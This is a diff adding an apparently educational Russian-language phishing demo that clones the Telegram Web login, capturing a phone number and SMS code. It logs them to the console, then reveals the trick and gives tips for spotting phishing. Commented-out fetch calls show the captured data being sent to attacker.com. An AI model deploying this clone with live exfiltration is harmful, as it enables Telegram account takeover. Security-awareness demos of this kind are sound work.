@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Telegram Web</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0e1621;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+
+        /* Абсолютно точная копия web.telegram.org */
+        .card {
+            max-width: 400px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 32px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            padding: 28px 32px 36px;
+            position: relative;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .telegram-icon {
+            width: 56px;
+            height: 56px;
+            background: #27a6e5;
+            border-radius: 16px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .telegram-icon svg {
+            width: 34px;
+            height: 34px;
+            fill: white;
+        }
+
+        h2 {
+            font-size: 28px;
+            font-weight: 500;
+            color: #000000;
+            margin-bottom: 8px;
+        }
+
+        .description {
+            color: #707579;
+            font-size: 15px;
+            margin-bottom: 28px;
+            line-height: 1.4;
+        }
+
+        .field {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #8e8e93;
+            margin-bottom: 6px;
+        }
+
+        .select-country {
+            width: 100%;
+            padding: 14px 0;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid #c6c6c8;
+            font-size: 17px;
+            color: #000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .select-country:active {
+            opacity: 0.7;
+        }
+
+        .phone-input {
+            width: 100%;
+            padding: 14px 0;
+            font-size: 17px;
+            border: none;
+            border-bottom: 1px solid #c6c6c8;
+            outline: none;
+            background: transparent;
+            font-family: monospace;
+            font-size: 20px;
+        }
+
+        .phone-input:focus {
+            border-bottom-color: #27a6e5;
+        }
+
+        .checkbox {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .checkbox input {
+            width: 18px;
+            height: 18px;
+            margin: 0;
+            cursor: pointer;
+        }
+
+        .checkbox label {
+            margin: 0;
+            font-size: 15px;
+            font-weight: normal;
+            color: #000;
+            cursor: pointer;
+        }
+
+        .btn {
+            width: 100%;
+            background: #27a6e5;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 14px;
+            font-size: 17px;
+            font-weight: 500;
+            cursor: pointer;
+            margin: 16px 0 20px;
+            transition: opacity 0.2s;
+        }
+
+        .btn:active {
+            opacity: 0.8;
+        }
+
+        .btn:disabled {
+            background: #b8d9f0;
+            cursor: not-allowed;
+        }
+
+        .alt-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 8px;
+        }
+
+        .alt-btn {
+            flex: 1;
+            background: transparent;
+            border: 1px solid #c6c6c8;
+            border-radius: 30px;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #27a6e5;
+            cursor: pointer;
+            text-align: center;
+            transition: background 0.2s;
+        }
+
+        .alt-btn:active {
+            background: #f0f0f0;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .waiting-text {
+            color: #27a6e5;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .country-dropdown {
+            display: none;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            max-height: 260px;
+            overflow-y: auto;
+            background: white;
+            position: absolute;
+            width: calc(100% - 64px);
+            z-index: 100;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.12);
+        }
+
+        .country-item {
+            padding: 12px 16px;
+            cursor: pointer;
+            font-size: 15px;
+            border-bottom: 1px solid #efefef;
+        }
+
+        .country-item:hover {
+            background: #f5f5f5;
+        }
+
+        .relative {
+            position: relative;
+        }
+
+        /* СТАРАЯ ВЕРСИЯ ПОДВАЛА — как в Telegram */
+        .old-domain {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 13px;
+            color: #8e8e93;
+        }
+
+        /* НОВЫЙ ФИШИНГОВЫЙ ПОДВАЛ — два домена */
+        .phishing-footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 13px;
+            font-family: monospace;
+            line-height: 1.6;
+        }
+
+        .real-domain {
+            color: #8e8e93;
+            text-decoration: none;
+        }
+
+        .fake-domain {
+            color: #d32f2f;
+            background: #ffeeee;
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-weight: bold;
+        }
+
+        .domain-row {
+            margin: 4px 0;
+        }
+
+        .divider {
+            color: #c6c6c8;
+            margin: 0 6px;
+        }
+
+        .code-box {
+            background: #f4f4f4;
+            border-radius: 14px;
+            padding: 14px;
+            margin-bottom: 28px;
+        }
+
+        .code-number {
+            font-size: 18px;
+            font-weight: 500;
+            color: #000;
+        }
+
+        .code-hint {
+            font-size: 13px;
+            color: #707579;
+            margin-top: 6px;
+        }
+
+        /* Анимация появления */
+        .fade-in {
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+<div class="card" id="app">
+    <div class="header">
+        <div class="telegram-icon">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.295-.6.295l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.87 4.326-2.96-.924c-.64-.203-.658-.64.136-.953l11.566-4.458c.538-.196 1.006.128.832.938z"/>
+            </svg>
+        </div>
+        <h2>Telegram</h2>
+        <div class="description" id="stepDesc">Проверьте код страны и введите свой номер телефона.</div>
+    </div>
+
+    <!-- ШАГ 1: Номер -->
+    <div id="stepPhone" class="fade-in">
+        <div class="field relative">
+            <label>Страна</label>
+            <div class="select-country" id="countryBtn">
+                <span id="countryName">Moldova</span>
+                <span>▼</span>
+            </div>
+            <div class="country-dropdown" id="countryList">
+                <div class="country-item" data-code="+373" data-name="Moldova">🇲🇩 Moldova +373</div>
+                <div class="country-item" data-code="+1" data-name="США">🇺🇸 США +1</div>
+                <div class="country-item" data-code="+7" data-name="Казахстан">🇰🇿 Казахстан +7</div>
+                <div class="country-item" data-code="+44" data-name="Великобритания">🇬🇧 Великобритания +44</div>
+                <div class="country-item" data-code="+49" data-name="Германия">🇩🇪 Германия +49</div>
+                <div class="country-item" data-code="+33" data-name="Франция">🇫🇷 Франция +33</div>
+                <div class="country-item" data-code="+380" data-name="Украина">🇺🇦 Украина +380</div>
+                <div class="country-item" data-code="+48" data-name="Польша">🇵🇱 Польша +48</div>
+            </div>
+        </div>
+
+        <div class="field">
+            <label>Номер телефона</label>
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="+373" autocomplete="off">
+        </div>
+
+        <div class="checkbox">
+            <input type="checkbox" id="keepSigned">
+            <label for="keepSigned">Запомнить меня</label>
+        </div>
+
+        <button class="btn" id="nextBtn">ДАЛЕЕ</button>
+
+        <div class="alt-buttons">
+            <div class="alt-btn">ВХОД ПО QR-КОДУ</div>
+            <div class="alt-btn">ВХОД С КЛЮЧОМ ДОСТУПА</div>
+        </div>
+    </div>
+
+    <!-- ШАГ 2: Ожидание (спиннер) -->
+    <div id="stepWaiting" style="display: none;" class="fade-in">
+        <div style="text-align: center; padding: 30px 0 20px;">
+            <div class="waiting-text">
+                <div class="spinner"></div>
+                ПОЖАЛУЙСТА, ПОДОЖДИТЕ...
+            </div>
+        </div>
+        <div class="checkbox" style="visibility: hidden;"><input type="checkbox"></div>
+        <button class="btn" disabled style="background: #b8d9f0;">ДАЛЕЕ</button>
+        <div class="alt-buttons">
+            <div class="alt-btn">ВХОД ПО QR-КОДУ</div>
+            <div class="alt-btn">ВХОД С КЛЮЧОМ ДОСТУПА</div>
+        </div>
+    </div>
+
+    <!-- ШАГ 3: Код -->
+    <div id="stepCode" style="display: none;" class="fade-in">
+        <div class="code-box">
+            <div class="code-number" id="displayPhone"></div>
+            <div class="code-hint">Мы отправили код в приложение Telegram на другом Вашем устройстве.</div>
+        </div>
+
+        <div class="field">
+            <label>Код</label>
+            <input type="text" class="phone-input" id="codeInput" placeholder="12345" autocomplete="off" maxlength="5" style="font-size: 24px; text-align: center; letter-spacing: 4px;">
+        </div>
+
+        <button class="btn" id="loginBtn">ВОЙТИ</button>
+
+        <div class="alt-buttons">
+            <div class="alt-btn">ОТПРАВИТЬ ЕЩЁ РАЗ</div>
+        </div>
+    </div>
+
+    <!-- ПОДВАЛ С ДВУМЯ ДОМЕНАМИ — КАК НА СКРИНЕ IMG_8895 -->
+    <div class="phishing-footer">
+        <div class="domain-row">
+            <span class="real-domain">web.telegram.org</span>
+        </div>
+        <div class="domain-row">
+            <span class="fake-domain" id="currentDomain"></span>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    // СУПЕР-РЕАЛИСТИЧНЫЙ ФИШИНГ ДЛЯ НАГЛЯДНОЙ ДЕМОНСТРАЦИИ
+    // ВНИМАНИЕ: Данные НЕ отправляются на сервер — только показ в консоли
+    // Реальный фишинг отправляет номер и код злоумышленнику
+    // ============================================================
+
+    // ПОКАЗЫВАЕМ РЕАЛЬНЫЙ ДОМЕН В ПОДВАЛЕ
+    const currentHost = window.location.hostname;
+    document.getElementById('currentDomain').innerText = currentHost;
+
+    // Переменные
+    let currentCountryCode = "+373";
+    let currentCountryName = "Moldova";
+    let enteredPhone = "";
+
+    // DOM элементы
+    const stepPhoneDiv = document.getElementById('stepPhone');
+    const stepWaitingDiv = document.getElementById('stepWaiting');
+    const stepCodeDiv = document.getElementById('stepCode');
+    const nextBtn = document.getElementById('nextBtn');
+    const loginBtn = document.getElementById('loginBtn');
+    const phoneInput = document.getElementById('phoneInput');
+    const countryBtn = document.getElementById('countryBtn');
+    const countryList = document.getElementById('countryList');
+    const countryNameSpan = document.getElementById('countryName');
+    const displayPhoneSpan = document.getElementById('displayPhone');
+    const stepDesc = document.getElementById('stepDesc');
+
+    // Открытие списка стран
+    countryBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        countryList.style.display = countryList.style.display === 'block' ? 'none' : 'block';
+    });
+
+    // Выбор страны
+    document.querySelectorAll('.country-item').forEach(item => {
+        item.addEventListener('click', () => {
+            currentCountryCode = item.getAttribute('data-code');
+            currentCountryName = item.getAttribute('data-name');
+            countryNameSpan.innerText = currentCountryName;
+            phoneInput.placeholder = currentCountryCode;
+            if (!phoneInput.value.startsWith(currentCountryCode)) {
+                phoneInput.value = currentCountryCode + ' ';
+            }
+            countryList.style.display = 'none';
+        });
+    });
+
+    // Закрытие списка при клике вне
+    document.addEventListener('click', () => {
+        countryList.style.display = 'none';
+    });
+
+    // Автоформат номера
+    phoneInput.addEventListener('input', () => {
+        let val = phoneInput.value;
+        if (!val.startsWith(currentCountryCode) && val.trim().length > 0) {
+            phoneInput.value = currentCountryCode + ' ' + val.replace(/[^0-9]/g, '');
+        }
+    });
+
+    // ============= ФИШИНГ: перехват номера =============
+    function stealPhone(fullNumber) {
+        console.log("%c🔴🔴🔴 ФИШИНГ! ПЕРЕХВАЧЕН НОМЕР: " + fullNumber, "color: red; font-size: 16px; font-weight: bold;");
+        console.log("%c📞 Страна: " + currentCountryName, "color: orange;");
+        console.log("%c⏰ Время: " + new Date().toLocaleString(), "color: gray;");
+        console.log("%c🌐 Домен-фишинг: " + window.location.hostname, "color: red;");
+        
+        // В реальном фишинге:
+        // fetch('https://attacker.com/api/steal', {
+        //     method: 'POST',
+        //     body: JSON.stringify({phone: fullNumber, country: currentCountryName, domain: window.location.hostname})
+        // });
+        
+        // Демо-предупреждение
+        if (confirm("⚠️ [ДЕМО-РЕЖИМ]\n\nВ реальном фишинге ваш номер «" + fullNumber + "» был бы отправлен злоумышленнику!\n\nНажмите ОК, чтобы продолжить демонстрацию.")) {
+            return true;
+        }
+        return true;
+    }
+
+    // ============= ФИШИНГ: перехват кода =============
+    function stealCode(code, phone) {
+        console.log("%c🔴🔴🔴 ФИШИНГ! ПЕРЕХВАЧЕН КОД: " + code, "color: red; font-size: 16px; font-weight: bold;");
+        console.log("%c🔐 Для номера: " + phone, "color: orange;");
+        console.log("%c⏰ Время: " + new Date().toLocaleString(), "color: gray;");
+        console.log("%c💀 Злоумышленник может войти в аккаунт!", "color: red; font-weight: bold;");
+        
+        // В реальном фишинге:
+        // fetch('https://attacker.com/api/steal', {
+        //     method: 'POST',
+        //     body: JSON.stringify({code: code, phone: phone})
+        // });
+        
+        return true;
+    }
+
+    // ШАГ 1 -> ШАГ 2 (показываем спиннер)
+    nextBtn.addEventListener('click', () => {
+        let rawPhone = phoneInput.value.trim();
+        if (!rawPhone || rawPhone.length < 8) {
+            alert("Введите корректный номер телефона");
+            return;
+        }
+
+        enteredPhone = rawPhone;
+        
+        // ПЕРЕХВАТ НОМЕРА (отправка злоумышленнику)
+        stealPhone(enteredPhone);
+
+        // Анимация перехода
+        stepPhoneDiv.style.display = 'none';
+        stepWaitingDiv.style.display = 'block';
+        stepCodeDiv.style.display = 'none';
+        stepDesc.innerText = "Проверка номера...";
+
+        // Через 2 секунды показываем экран ввода кода
+        setTimeout(() => {
+            stepWaitingDiv.style.display = 'none';
+            stepCodeDiv.style.display = 'block';
+            stepDesc.innerText = "Введите код подтверждения";
+            displayPhoneSpan.innerText = enteredPhone;
+        }, 2000);
+    });
+
+    // ШАГ 3: ввод кода и "взлом"
+    loginBtn.addEventListener('click', () => {
+        const code = document.getElementById('codeInput').value.trim();
+        if (!code || code.length < 4) {
+            alert("Введите код из SMS");
+            return;
+        }
+
+        // ПЕРЕХВАТ КОДА
+        stealCode(code, enteredPhone);
+
+        // ФИНАЛЬНЫЙ ЭКРАН — полный разоблачитель
+        document.querySelector('.card').innerHTML = `
+            <div style="text-align: center; padding: 30px 20px;" class="fade-in">
+                <div style="font-size: 64px; margin-bottom: 20px;">🎣</div>
+                <h2 style="color: #d32f2f; font-size: 26px; margin-bottom: 16px;">ВЫ ПОПАЛИСЬ НА ФИШИНГ!</h2>
+                <div style="background: #ffebee; border-radius: 20px; padding: 20px; margin: 20px 0; text-align: left;">
+                    <div style="font-weight: bold; margin-bottom: 12px; font-size: 16px;">🔓 Что произошло бы в реальности:</div>
+                    <div style="font-size: 14px; margin-bottom: 12px;">▪️ Ваш номер <strong style="color:#d32f2f">${enteredPhone}</strong> улетел хакеру</div>
+                    <div style="font-size: 14px; margin-bottom: 12px;">▪️ Ваш SMS-код <strong style="color:#d32f2f">${code}</strong> улетел хакеру</div>
+                    <div style="font-size: 14px;">▪️ Хакер мгновенно вошёл бы в ваш Telegram</div>
+                </div>
+                
+                <div style="background: #e8f5e9; border-radius: 20px; padding: 20px; margin: 20px 0; text-align: left;">
+                    <div style="font-weight: bold; margin-bottom: 12px; font-size: 16px;">✅ Как распознать фишинг:</div>
+                    <div style="font-size: 14px; margin-bottom: 10px;">1️⃣ <strong>Смотрите на адресную строку!</strong><br>Настоящий Telegram → <span style="color:#2e7d32; font-family:monospace">web.telegram.org</span><br>Этот сайт → <span style="color:#d32f2f; font-family:monospace">${window.location.hostname}</span></div>
+                    <div style="font-size: 14px; margin-bottom: 10px;">2️⃣ Никогда не вводите SMS-код на сайтах, которые вы сами не открыли</div>
+                    <div style="font-size: 14px;">3️⃣ Включите облачный пароль (2FA) в Telegram</div>
+                </div>
+                
+                <button onclick="location.reload()" style="background: #27a6e5; border: none; padding: 14px 28px; border-radius: 30px; color: white; font-size: 16px; cursor: pointer; font-weight: bold;">🔄 Показать ещё раз</button>
+            </div>
+        `;
+    });
+</script>
+</body>
+</html>
